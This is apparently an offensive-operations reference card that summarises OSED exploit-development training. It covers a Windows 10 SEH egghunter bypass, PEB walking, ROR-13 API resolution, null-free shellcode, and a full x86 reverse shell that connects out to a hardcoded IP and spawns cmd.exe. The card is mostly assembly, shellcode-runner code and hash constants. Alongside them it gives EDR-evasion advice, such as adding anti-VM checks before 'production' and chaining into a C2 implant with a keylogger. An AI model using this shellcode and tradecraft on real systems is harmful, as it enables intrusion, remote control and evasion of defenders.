---
id: RTO-osed-03-seh-egghunters-shellcode-rev
name: OSED — SEH Egghunters, Custom Shellcode, & Reverse Engineering for Bugs
source: Offensive Security Exploit Development (OSED) / OffSec
category: shellcode-development
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-002, T-004, T-016, T-020, T-021]
tags: [shellcode, egghunter, seh, peb, export-directory, ror13-hash, pic, null-free, reverse-shell, reverse-engineering, windbg, ida-pro, x86]
---

# OSED — SEH Egghunters, Custom Shellcode, & Reverse Engineering — Training Reference

## TL;DR
This module covers three intertwined disciplines from OSED: (1) porting the SEH-based egghunter to Windows 10 by surgically bypassing the `RtlDispatchException` validation chain (StackBase overwrite), (2) writing null-free, position-independent x86 shellcode from scratch using PEB walking, Export Directory Table parsing, and ROR-13 hashing — culminating in a full reverse shell — and (3) a methodology for reverse engineering closed-source network services (Tivoli Storage Manager FastBack) using WinDbg + IDA Pro synchronization. The vault's T-004 (PEB Walker) is the modern x64/Rust descendant of the x86 FS:[0x30] PEB walk taught here; T-002 (VEH Gate) covers the same `KiUserExceptionDispatcher`/`RtlDispatchException` machinery abused by the SEH egghunter.

## Key Concepts

1. **SEH-based egghunter on Windows 10** — The classic SEH egghunter registers a custom `_EXCEPTION_REGISTRATION_RECORD` via `fs:[0]` (ExceptionList) and triggers access violations to scan memory pages. On Windows 10, `RtlDispatchException` performs four sanity checks before dispatching to the handler — the egghunter fails the fourth check (handler must reside above `StackBase`). Bypass: overwrite `fs:[0x04]` (StackBase) with `handler_addr - 0x04` so the comparison succeeds while leaving the real record intact.

2. **The four `RtlDispatchException` checks** (must all pass to reach `RtlIsValidHandler`):  
   (a) `_EXCEPTION_REGISTRATION_RECORD` address > `StackLimit` (TEB+0x08)  
   (b) `_EXCEPTION_REGISTRATION_RECORD` address + 0x08 < `StackBase` (TEB+0x04)  
   (c) `_EXCEPTION_REGISTRATION_RECORD` address aligned to 4-byte boundary (`test cl,3`)  
   (d) `_except_handler` function address > `StackBase` — this is the one the egghunter bypasses via StackBase overwrite.

3. **CONTEXT structure EIP rewriting** — The egghunter's `_except_handler` (a 0x0C-offset CONTEXT argument fetched via `mov eax, [esp+ecx]` where ecx=0x0C) overwrites `CONTEXT.Eip` (`+0xB8`) by adding 0x06 to skip past the faulting `repe scasb` and resume the `loop_inc_page` cycle. Return `ExceptionContinueExecution` (EAX=0) via stack cleanup of 0x10 bytes.

4. **WinDbg exception suppression for egghunters** — `sxd av` (disable access-violation break) and `sxd gp` (disable guard-page break) prevent the debugger from halting on every faulting page probe. Without this, the egghunter never reaches the egg.

5. **PEB → `_PEB_LDR_DATA` → `InInitializationOrderModuleList` walk** — `fs:[0x30]` → PEB → `+0x0C` → Ldr → `+0x1C` → first entry. Walk Flink; the third entry (after ntdll, kernel32) is kernel32.dll base in `_LDR_DATA_TABLE_ENTRY_+0x18 DllBase`. Module name at `+0x20` (BaseDllName.Buffer). Identification: probe WORD at `BaseDllName.Buffer + 12*2` for NULL terminator (kernel32.dll = 12 wide chars = 24 bytes).

6. **Export Directory Table (EDT) parsing** — From `kernel32!DOS_HEADER + e_lfanew` (at +0x3C) → NT_HEADERS → OptionalHeader (+0x18) → DataDirectory[0] (+0x60 → +0x78 from DOS base) → EDT. Three arrays: `AddressOfNames` (+0x20), `AddressOfNameOrdinals` (+0x24), `AddressOfFunctions` (+0x1C). Index `i` in Names maps to Ordinal[i], which indexes into Functions to yield the RVA → add DllBase for VMA.

7. **ROR-13 hash for symbol resolution** — `xor eax,eax; cdq; cld; lodsb; test al,al; jz done; ror edx,0x0d; add edx,eax; jmp loop`. Produces a stable 4-byte hash per export name. Equivalent Python: `ror(edx,13); edx += ord(c)` per character. Verified collision-free in practice for kernel32/ws2_32 exports.

8. **Null-free PIC technique** — `sub esp, 0x200` contains nulls; replace with `add esp, 0xfffffdf0`. Direct `call func` produces null-bearing relative offsets; replace with `call pop` trampoline (`call find_function_ret` pushes return address → `pop esi` captures `find_function` VMA → store at `[ebp+0x04]` → indirect `call dword ptr [ebp+0x04]`). Yields position-independent code injectable at any VMA.

9. **Stack-built structures for API calls** — `WSADATA` (~0x18E bytes), `sockaddr_in` (0x10 bytes), `STARTUPINFOA` (0x44 bytes), `PROCESS_INFORMATION` (0x10 bytes) all constructed inline on the stack via PUSH sequences; pointers obtained with `push esp; pop edi`. Stack offsets for subsequent API calls must be `sub`'d to avoid overwriting populated structures.

10. **Reverse engineering methodology** — (a) TCPView enumeration of external listening ports; (b) attach WinDbg to service process; (c) `bp wsock32!recv` to catch inbound data; (d) capture call stack (`k`) to identify the owning PE module; (e) load that PE in IDA Pro; (f) synchronize by navigating IDA to the return address hit in WinDbg post-`recv`; (g) trace input with hardware breakpoints (`ba r1 <addr>`) to identify irrelevant vs. relevant code paths without stepping into every call.

## Operational Techniques

### SEH Egghunter Windows 10 Port (StackBase Overwrite)

- **What**: Modifies the classic SEH egghunter to overwrite `fs:[0x04]` (TEB StackBase) so the `RtlDispatchException` sanity check #4 passes, allowing the in-stack `_except_handler` to execute on Windows 10.
- **When to use**: When a target has SEH-based exploitation surface (no SafeSEH, no /GS, no ASLR — verified with `!nmod` narly), tight space constraints force a staged egg+payload design, and the target is Windows 10/Server 2016+ where the classic egghunter no longer works unmodified.
- **How**:
  1. Verify target protections with `!nmod` (offsec binary: `/SafeSEH OFF`, no GS, no ASLR, no DEP).
  2. Build the `_EXCEPTION_REGISTRATION_RECORD` on stack: push handler addr, push 0xFFFFFFFF (Next), overwrite `fs:[0]` (ExceptionList) with ESP.
  3. **NEW**: subtract 0x04 from ECX (handler address), then overwrite `fs:[0x04]` (StackBase) with this value. This satisfies check #4 (`handler > StackBase`) because `handler - 0x04 > ExceptionList`.
  4. Trigger access violation via `repe scas dword ptr es:[edi]` against unmapped memory.
  5. WinDbg: `sxd av` and `sxd gp` before continuing, or first-chance AVs will halt execution.
  6. Handler recovers by fetching CONTEXT pointer via `[esp+0x0C]`, modifying `CONTEXT.Eip` at `+0xB8` by `add dword [eax+0xB8], 6`, then `pop eax; add esp, 0x10; push eax; xor eax, eax; ret` to simulate `ExceptionContinueExecution`.
- **Vault link**: T-002 (VEH Gate) — VEH Gate abuses the same `KiUserExceptionDispatcher`/`RtlDispatchException` path but uses HW breakpoints to redirect execution; the SEH egghunter uses the older SEH registration mechanism. T-002 is the modern x64/Rust equivalent for indirect syscall dispatch where this technique is for exploit payload staging in x86 environments.
- **Tool/code**:
  ```
  build_exception_record:
    pop ecx                            ; handler addr
    mov eax, 0x74303077                ; egg "w00t"
    push ecx                           ; Handler
    push 0xffffffff                    ; Next
    xor ebx, ebx
    mov dword ptr fs:[ebx], esp        ; ExceptionList
    sub ecx, 0x04                      ; NEW: handler - 4
    add ebx, 0x04
    mov dword ptr fs:[ebx], ecx        ; StackBase overwrite
  ```
- **OPSEC**: The `fs:[0x04]` overwrite corrupts the TEB StackBase for the running thread — visible to any EDR telemetry sampling TEB state. Modern EDRs (esp. with kernel callbacks on `PsSetCreateThreadNotify`) flag non-system threads with anomalous TEB StackBase. On systems with SafeSEH, the technique fails outright (RtlIsValidHandler rejects the handler). Use only when target binary is confirmed SafeSEH-OFF.

### PEB-based kernel32.dll Base Resolution

- **What**: x86 shellcode technique to dynamically locate `kernel32.dll` base address without hardcoded pointers, defeating ASLR.
- **When to use**: Any time shellcode is loaded at an unknown VMA on Vista+ — required for all subsequent API resolution.
- **How**:
  1. `xor ecx, ecx` → ECX = 0
  2. `mov esi, fs:[ecx+0x30]` → ESI = PEB (TEB+0x30)
  3. `mov esi, [esi+0x0C]` → ESI = PEB->Ldr (`_PEB_LDR_DATA*`)
  4. `mov esi, [esi+0x1C]` → ESI = InInitializationOrderModuleList.Flink
  5. Walk: `mov ebx, [esi+0x08]` (DllBase), `mov edi, [esi+0x20]` (BaseDllName.Buffer), `mov esi, [esi]` (next Flink)
  6. `cmp [edi+12*2], cx` — checks for NULL WORD at offset 24 in module name (kernel32.dll = 12 wide chars = 24 bytes).
  7. `jne next_module` until match.
- **Vault link**: T-004 (PEB Walker) — the vault's x64/Rust implementation uses `gs:[0x60]` (the 64-bit TEB→PEB pointer at gs:[0x60] vs. fs:[0x30] on x86). Same conceptual technique; T-004 also adds DJB2 hashing instead of ROR-13. This OSED reference is the canonical x86 ancestor.
- **Tool/code**: Verified in WinDbg with `dt nt!_TEB @$teb`, `dt nt!_PEB`, `dt _PEB_LDR_DATA`, `dt _LDR_DATA_TABLE_ENTRY`. On Win10 1709 (16299): ntdll is first entry, kernel32.dll is third.
- **OPSEC**: PEB walking itself is hard to detect (no syscall, no API call) — this is the OPSEC-friendliest module resolution available. EDRs that hook `LdrLoadDll` see nothing.

### ROR-13 Symbol Resolution via Export Directory Table

- **What**: Replaces `GetProcAddress` with inline hash-based export scanning, yielding a self-contained GetProcAddress equivalent.
- **When to use**: Once kernel32 base is known, resolve `LoadLibraryA`, `GetProcAddress`-equivalent, and any other needed exports without depending on kernel32 itself being pre-resolved.
- **How**:
  1. `pushad` (save state, register pressure is high)
  2. `mov eax, [ebx+0x3c]` → PE signature offset (e_lfanew)
  3. `mov edi, [ebx+eax+0x78]` → Export Table Directory RVA
  4. `add edi, ebx` → VMA
  5. `mov ecx, [edi+0x18]` → NumberOfNames (loop counter)
  6. `mov eax, [edi+0x20]` → AddressOfNames RVA; `add eax, ebx` → VMA; save at `[ebp-4]`
  7. Loop: `jecxz finished; dec ecx; mov eax, [ebp-4]; mov esi, [eax+ecx*4]; add esi, ebx` → name VMA in ESI
  8. Hash via `lodsb; test al, al; jz finished; ror edx, 0x0d; add edx, eax; jmp loop`
  9. `cmp edx, [esp+0x24]` (pre-pushed target hash); `jnz find_function_loop`
  10. On match: `mov edx, [edi+0x24]; add edx, ebx` → AddressOfNameOrdinals VMA
  11. `mov cx, [edx+2*ecx]` → ordinal
  12. `mov edx, [edi+0x1c]; add edx, ebx` → AddressOfFunctions VMA
  13. `mov eax, [edx+4*ecx]; add eax, ebx` → function VMA
  14. `mov [esp+0x1c], eax` (overwrite PUSHAD-saved EAX slot)
  15. `popad; ret`
- **Vault link**: T-004 (PEB Walker) + T-002 (Hell's/Halo's/Tartarus Gate) — vault uses DJB2 (different hash) for symbol resolution and operates on `ntdll` for SSN extraction rather than `kernel32` for export resolution. The ROR-13 algorithm here is a complementary, lower-overhead hash suitable for shellcode; DJB2 is preferred in Rust for compile-time const-folding. Both share the export-table-walking primitive.
- **Tool/code**: Python hash script:
  ```python
  edx = 0
  for i, c in enumerate(s):
      edx += ord(c)
      if i < len(s) - 1:
          edx = ror(edx, 13)
  ```
  Example hashes: `TerminateProcess` = `0x78b5b983`, `LoadLibraryA` = `0xec0e4e8e`, `CreateProcessA` = `0x16b3fe72`, `WSAStartup` = `0x3bfcedcb`.
- **OPSEC**: Walking export tables touches only image memory; no syscalls, no API hooks. Detection risk is near-zero at runtime. EDR static signatures for ROR-13 hash constants are well-known — operators should consider rotating the rotation count or using a non-canonical hash function.

### NULL-Free PIC via CALL/POP Trampoline

- **What**: Technique to eliminate NULL bytes from CALL instructions by exploiting negative-offset near calls and using the pushed return address as a runtime PC anchor.
- **When to use**: Whenever shellcode must survive string-based copying (strcpy, sprintf, recv-into-fixed-buffer) where NULLs terminate the copy.
- **How**:
  1. Replace `sub esp, 0x200` → `add esp, 0xfffffdf0` (negative equivalent)
  2. Reorder functions so the CALL target is *above* the call site (negative offset)
  3. Trampoline: `jmp find_function_shorten_bnc` → `call find_function_ret` (negative offset call, no NULLs) → pushes return addr → `pop esi` captures VMA of `find_function` → store at `[ebp+0x04]`
  4. Use `call dword ptr [ebp+0x04]` (indirect, opcodes `ff 55 04` — no NULLs)
- **Vault link**: T-021 (Crypto & Obfuscation) covers shellcode encoding (IPv4/IPv6/MAC/UUID/words) for NULL-byte evasion at the payload layer; this OSED technique addresses NULL evasion at the shellcode authoring layer. They complement — encode after writing null-free.
- **Tool/code**: Keystone + ctypes runner:
  ```python
  ks = Ks(KS_ARCH_X86, KS_MODE_32)
  encoding, count = ks.asm(CODE)
  ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
  ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(shellcode))
  ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, byref(ctypes.c_int(0)))
  ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
  ```
- **OPSEC**: NULL-free PIC shellcode survives `strcpy`-class copy primitives and works across ASLR/non-ASLR targets. Keystroke `int3` breakpoints must be removed before deployment (annotated in OSED script as `# REMOVE ME WHEN NOT DEBUGGING!!!!`).

### Reverse Shell Shellcode (ws2_32 chain)

- **What**: Complete x86 null-free reverse shell using `WSAStartup` → `WSASocketA` → `WSAConnect` → `CreateProcessA` with socket descriptor bound to stdin/stdout/stderr.
- **When to use**: Post-exploitation stage for traditional RCE primitives where an operator wants a POSIX-style pipe shell rather than a full C2 implant.
- **How**:
  1. Resolve `LoadLibraryA`, `CreateProcessA`, `TerminateProcess` from kernel32.
  2. Load `ws2_32.dll` via `LoadLibraryA` — string pushed in reverse DWORD order: `mov ax, 0x6c6c` (trailing "ll"), `push 0x642e3233` ("32.d"), `push 0x5f327377` ("ws2_"), `push esp` (pointer), call.
  3. From ws2_32 (EBX now = ws2_32 base): resolve `WSAStartup`, `WSASocketA`, `WSAConnect`.
  4. `WSAStartup(0x0202, &wsadata)` — wsadata buffer reserved at `esp - 0x590` to avoid later overwrite.
  5. `WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, NULL, NULL, NULL)` — args derived via `mov al, 0x06; push; sub al, 0x05; push; inc eax; push` to avoid NULLs.
  6. `WSAConnect(s, &sockaddr_in, 0x10, NULL, NULL, NULL, NULL)` — `sockaddr_in` built on stack: `push 0; push 0x7877a8c0` (192.168.119.120 reversed), `mov ax, 0xbb01; shl eax, 0x10; add ax, 0x02; push eax` (port 443 + AF_INET=2).
  7. `STARTUPINFOA` built on stack with `cb=0x44`, `dwFlags=0x100` (STARTF_USESTDHANDLES), `hStdInput/Output/Error = socket descriptor`.
  8. `CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)` — `lpProcessInformation` reserved at `esp - 0x390`.
- **Vault link**: T-022 (Network Suite) and T-023 (Client Capabilities) — the vault implements a full Rust C2 client (HVNC, keylogger, screen capture, SOCKS5, malleable C2) rather than raw reverse shell. This OSED reference is the foundational primitive for operators who need a minimal stage-0 bootstrap before pivoting to a Rust implant. T-019 (Edo Dead Drop) provides autonomous C2 fallback when direct TCP reverse shells fail.
- **Tool/code**: Full source is `reverse_shell_0x05.py` (Keystone-assembled). Hardcoded constants for 192.168.119.120:443 must be rotated per engagement. The "cmd.exe" string is constructed via `mov eax, 0xff9a879b; neg eax; push eax; push 0x2e646d63` to avoid the NULL byte in the `00` between "cmd" and ".exe".
- **OPSEC**: `WSASocketA` + `WSAConnect` triggers standard ETW `Microsoft-Windows-Kernel-Network` events. The cmd.exe child process inherits the socket handle — visible in `!handle` dumps. Modern EDRs flag `CreateProcessA` with `bInheritHandles=TRUE` + socket-handle-in-STARTUPINFO as a classic shell pattern. Use only for low-fidelity target EDR or as a stage-0 prior to implant migration.

### Reverse Engineering Methodology (WinDbg + IDA Sync)

- **What**: Synchronized dynamic (WinDbg) and static (IDA Pro) analysis workflow for closed-source network services.
- **When to use**: Discovering 0-days in vendor binaries with network attack surface, where source is unavailable.
- **How**:
  1. **Enumerate** with TCPView — disable "Resolve Addresses", identify external-listening processes and ports (Tivoli: `FastBackServer.exe` on 11460; `FastBackMount.exe` on 30051).
  2. **Hook input**: `bp wsock32!recv` (or `ws2_32!recv` on modern systems) — sends a small PoC from a Python socket client.
  3. **Verify buffer**: `dd esp L5` to read recv args (s, buf, len, flags); `pt` to step to ret; `dd <buf>` to confirm payload bytes.
  4. **Identify owning module**: `k` (call stack) — find return addresses in lm output to know which PE to load in IDA.
  5. **Locate on disk**: `lm m <module>` shows full path.
  6. **Sync IDA**: `Jump > Jump to function...` in IDA, navigate to the return address hit in WinDbg.
  7. **Trace input**: `ba r1 <buf_addr>` hardware breakpoint on input buffer. Step over calls; if breakpoint doesn't fire, the call is irrelevant to input parsing — skip it.
  8. **Translate ASM → C pseudocode**: `cmp + jne` = `if (x != y) {...}`; `mov + cmp + jne` chains = `if (x == C1 && x == C2) {...}`.
- **Vault link**: T-020 (Anti-Analysis Suite) covers the operator-side equivalent — IAT camouflage, API hammering, anti-VM. This OSED reference is the *analyst-side* counterpart: how to reverse the very artifacts T-020 produces. Operators authoring evasion primitives should study this methodology to anticipate reverse-engineering workflows.
- **Tool/code**: PoC send-and-trace:
  ```python
  import socket
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, 11460))
  s.send(b"\x41" * 100)
  ```
  WinDbg commands used: `bp`, `g`, `pt` (step to ret), `dd`, `k` (stack), `ba r1 <addr>` (HW read BP), `bc *` (clear), `dt <struct>`.
- **OPSEC**: When debugging live vendor services, WinDbg halts the thread; long pauses trigger `WARNING: Step/trace thread exited`. Restart debugging session if this occurs. Service-level telemetry (e.g., FastBack's `PERFMON_S_UpdateCounter`) may log abnormal pause durations.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| WinDbg `bp wsock32!recv` / `bp ws2_32!recv` | Catch network input entry point | Pauses service thread; can be detected by timing |
| WinDbg `ba r1 <addr>` | Hardware read breakpoint on input buffer | Invisible to most anti-debug; uses DR registers |
| WinDbg `sxd av` / `sxd gp` | Suppress first-chance AV and guard page breaks | Required for egghunter testing |
| WinDbg `!nmod` (narly) | Verify SafeSEH/GS/ASLR/DEP on loaded modules | Read-only inspection |
| WinDbg `dt _EXCEPTION_REGISTRATION_RECORD` | Dump SEH chain | Read-only |
| WinDbg `!teb` | Dump TEB (ExceptionList, StackBase, StackLimit) | Read-only |
| WinDbg `k` | Call stack to identify owning PE module | Read-only |
| WinDbg `lm m <module>` | List module path on disk | Read-only |
| WinDbg `!dh -f <module>` | Dump PE file headers (Export Directory RVA etc.) | Read-only |
| WinDbg `? <expr>` | Evaluate expression (hex/dec/bin conversion) | Read-only |
| IDA Pro `Jump > Jump to function...` | Static navigation to function entry | Static analysis only |
| Keystone (`Ks(KS_ARCH_X86, KS_MODE_32)`) | Assemble x86 shellcode from string | Pure dev tool, no target interaction |
| Python `ctypes.windll.kernel32.VirtualAlloc/RtlMoveMemory/CreateThread` | Shellcode test harness in python.exe | Triggers ETW process/thread creation; fine for dev VM |
| SysInternals TCPView | Enumerate listening ports + processes | GUI; can be replaced by `netstat -ano` for headless recon |
| ComputeHash.py (ROR-13) | Pre-compute target symbol hashes | Offline tool |

## Gaps & Extensions

**What the vault covers that this training doesn't**:
- **x64 PEB walking via `gs:[0x60]`** (T-004) — OSED only covers x86 `fs:[0x30]`. Operators targeting x64 targets should consult T-004 directly.
- **VEH Gate as syscall primitive** (T-002) — uses the same `KiUserExceptionDispatcher` machinery but as an indirect syscall dispatch path; OSED's SEH egghunter uses it only as a memory-scan primitive.
- **Stack spoofing / arg spoofing / AMSI/ETW patching** (T-016) — OSED covers none of these modern EDR evasion primitives. A modern reverse-shell stage-0 should chain `WSAConnect` with stack-spoofed frames (T-016 AdvancedStack) before calling `CreateProcessA`.
- **Shellcode encoding (IPv4/IPv6/MAC/UUID)** (T-021) — OSED produces raw NULL-free PIC; encoding to UUID/IPv6 is a separate post-processing step.
- **Malleable C2 + multi-chain vault + peer relay** (T-022, T-019) — operators needing resilient C2 should pivot from OSED's stage-0 reverse shell to the vault's full C2 stack.
- **Anti-VM, API hammering, IAT camouflage** (T-020) — OSED assumes a non-hostile target. Operators shipping the reverse shell into production should pre-stage anti-VM checks.

**What this training covers that the vault doesn't**:
- **The four-check `RtlDispatchException` validation chain and StackBase overwrite** — not documented in the vault's T-002 VEH Gate card. This is essential knowledge for any operator working with SEH/VEH primitives on x86 Windows 10+.
- **Step-by-step `RtlDispatchException` reverse engineering** with `bp ntdll+0x46B45` style breakpoint-driven tracing — a transferable methodology for reverse-engineering any ntdll dispatcher.
- **Complete from-scratch x86 null-free reverse shell** in assembly — the vault assumes the operator already has a working shellcode; this is the foundational craft.
- **WinDbg + IDA synchronization workflow for closed-source binaries** — the vault documents Rust-internal patterns but not reverse engineering of vendor targets.
- **Hardware-breakpoint-based input tracing** (`ba r1 <buf>`) to filter relevant vs. irrelevant calls — a generalizable RE methodology not in the vault.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| x86 PEB walk via `fs:[0x30]` | T-004 PEB Walker | Vault implements x64 equivalent via `gs:[0x60]` with DJB2 hashing; OSED is the x86 ancestor |
| ROR-13 hash for export resolution | T-004 (DJB2 hashing) + T-002 (RVA sort for SSN) | Same primitive (export table walk); different hash function. Vault uses DJB2 for compile-time const-folding in Rust |
| SEH registration via `fs:[0]` + `RtlDispatchException` checks | T-002 VEH Gate | Both abuse `KiUserExceptionDispatcher`/`RtlDispatchException`. VEH Gate uses VEH list + HW breakpoints for indirect syscall dispatch; SEH egghunter uses classic SEH for memory scanning |
| StackBase overwrite to bypass `RtlDispatchException` check #4 | T-002 (HW BP mediation) | Vault's VEH Gate sidesteps the SEH validation entirely by registering through `RtlAddVectoredExceptionHandler` which doesn't run the SEH chain checks |
| `sxd av` / `sxd gp` for egghunter fault suppression | (none) | No vault equivalent — vault operates at the syscall layer, not fault-based memory scanning |
| NULL-free PIC via CALL/POP trampoline | T-021 Shellcode Encoding | OSED technique is shellcode-authoring-layer NULL evasion; T-021 is payload-encoding-layer NULL evasion. Compose both for stacked defense |
| `WSAStartup`→`WSASocketA`→`WSAConnect`→`CreateProcessA` reverse shell | T-022 Network Suite (SOCKS5, HVNC, malleable C2) + T-023 Client Capabilities | OSED is stage-0 bootstrap; vault is full implant. Operators chain OSED stage-0 → T-019 dead drop discovery → T-022 transport → T-023 capabilities |
| `bp wsock32!recv` + WinDbg/IDA sync RE methodology | T-020 Anti-Analysis (IAT camouflage, API hammering) | OSED is the *analyst-side* methodology that T-020's *operator-side* evasion primitives aim to defeat |
| `ba r1 <addr>` hardware breakpoint input tracing | (none) | No vault equivalent — vault documents operator primitives, not RE workflow |
| Stack-constructed `STARTUPINFOA` with socket handle | (none) | Vault's T-023 client uses full Rust-side handle management, not in-shellcode struct construction |
| `!nmod` SafeSEH/GS/ASLR/DEP verification | T-013 (remaining injection), T-016 (EDR evasion) | OSED uses pre-exploit for target validation; vault uses post-exploit for evasion stack selection |
| Keystoned `int3` debugging anchor (`# REMOVE ME WHEN NOT DEBUGGING!!!!`) | T-020 API hammering (FPU/SIMD) | OSED uses int3 for dev-time breakpoints; vault uses int3-style traps as anti-debug canaries |
| CONTEXT.Eip (+0xB8) rewrite in `_except_handler` | T-002 (HW BP EIP capture) | Both manipulate EIP via exception machinery. VEH Gate captures via DR6/DR7; SEH egghunter rewrites CONTEXT directly |